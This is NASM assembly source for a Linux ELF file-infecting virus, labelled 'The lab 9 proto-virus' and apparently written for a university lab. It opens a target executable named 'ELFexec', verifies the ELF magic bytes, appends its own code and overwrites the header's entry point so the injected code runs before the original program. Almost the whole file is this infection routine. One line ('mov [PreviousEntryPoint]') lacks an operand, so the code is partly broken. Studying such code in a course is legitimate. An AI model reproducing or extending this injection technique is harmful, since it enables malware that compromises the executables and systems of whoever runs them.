%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdin 1
%define BUF_OFFSET 10

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .data

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES           	 	; Set up ebp and reserve space on the stack for local storage

	call get_my_loc
	sub ebx, next_i - OutStr	 	; get address of string virusMsg
	write stdin, ebx, 32 			; print msg using printf

	call dword [PreviousEntryPoint]

cont:
	mov dword [PreviousEntryPoint], VirusExit

	call get_my_loc
	sub ebx, next_i-FileName 		; get address of string FileName
	open ebx, RDWR, 0777 			; call open syscall

	cmp eax, -1
	je error	 					; make sure file opened successfully

	mov [ebp-4], eax 				; save fd in stack
	lseek eax, 0, SEEK_SET 			; pointing to start of file

	mov ebx, ebp 					; move start of stack to ebx
	sub ebx, BUF_OFFSET 			; substract from ebx buffer size, now buffer start is in ebx
	mov eax, [ebp-4] 				; get fd to eax

	read eax, ebx, 4 				; read first 4 bytes in order to make sure this is an ELF file

	mov ebx, ebp
	sub ebx, BUF_OFFSET
	cmp dword [ebx], 0x464c457f 	; checking if first 4 bytes are '7f', '45', '4c', '46'
	jne error

	mov ebx, [ebp-4] 				; moving into ebx the fd pushed earlier
	lseek ebx, 0, SEEK_END

	mov ebx, ebp
	sub ebx, STK_RES 				; pointer to bottom of stack
	add ebx, ENTRY 					; point to entry point
	mov ecx, [ebx] 					; save old entry point
	mov [PreviousEntryPoint]




	mov dword [ebp-16], eax 				; saving file size in [ebp-16]
	mov ebx, [ebp-4] 						; moving into ebx the fd pushed earlier
	write ebx, _start, virus_end-_start 	; writing virus code to ELF file

	mov eax, [ebp-4] 				; moving fd to eax
	lseek eax, 40, SEEK_SET 		; pointing to file header size(40 bytes from start)

	mov eax, [ebp-4] 				; moving fd to eax
	lea ebx, [ebp-8] 				; save header size in ebp-8
	read eax, ebx, 2 				; read 2 bytes describing header size

	cmp word [ebp-8], 180 			; making sure there is enough memory in stack(200-20 for local vars)
	jg error

	mov eax, [ebp-4] 				; get fd
	lseek eax, 0, SEEK_SET 			; point to beginning of file
	mov eax, [ebp-4]
	mov ebx, ebp
	sub ebx, STK_RES 				; pointer to bottom of stack

;;forMe: ebx is buffer, eax is fd, ebp-8 is header size

	read eax, ebx, [ebp-8] 			; read file header into stack memory
	mov ebx, ebp 					; reset to buffer
	sub ebx, STK_RES 				; reset to buffer

;;change entry to virus code
	add ebx, ENTRY 					; address of headers entry point
	mov ecx, [ebx] 					; save old entry point
	mov [ebp-12], ecx 				; store in [ebp-12]

	mov eax, dword [ebp-16] 		; move to eax file size
	add eax ,0x08048000 			; add constant entry point address(from program header)
	mov dword [ebx], eax 		 	; change entry to virus code

;;; notes: 	;; eax is file descriptor 
			;; ecx is buffer, contains infected header

	mov eax, [ebp-4] 				; get fd
	lseek eax, 0, SEEK_SET 			; point to beginning of file
	mov eax, [ebp-4]				; get fd
	lea ecx, [ebp-STK_RES]			; get buffer
	write eax, ecx, [ebp-8]			; write new file header into stack memory (header size is 52)

	call dword [PreviousEntryPoint]

VirusExit:
	close [ebp-4] 					; close opened file

    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
FailStr:    db "perhaps not", 10, 0

get_my_loc:
	call next_i
next_i:
	pop ebx
	ret

error:
	call get_my_loc
	sub ebx, next_i-FailStr 		; get address of string virusMsg
	write stdin, ebx, 13			; print msg using printf
	exit -1

PreviousEntryPoint: dd cont
virus_end:
